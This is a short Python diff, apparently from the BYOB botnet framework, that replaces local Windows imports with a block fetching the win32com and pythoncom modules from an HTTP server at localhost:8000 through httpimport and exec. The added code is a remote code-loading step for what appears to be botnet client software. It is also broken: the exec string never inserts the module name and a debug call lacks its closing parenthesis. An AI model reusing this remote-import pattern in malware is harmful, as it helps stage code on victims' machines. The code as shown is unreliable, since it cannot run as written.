@@ -11,13 +11,17 @@ import os
 import sys
 import json
 
-# Windows
-if os.name == 'nt':
-    import win32com.client
-    import pythoncom
-
 # byob
+
 import util
+
+# remote imports
+with httpimport.remote_repo(['win32com','pythoncom'], base_url='http://localhost:8000'):
+        for module in ['win32com','pythoncom']:
+            try:
+                exec "import %s" in globals()
+            except ImportError:
+                util.debug("Error: unable to import '%s'" % module
 
 
 results = {}
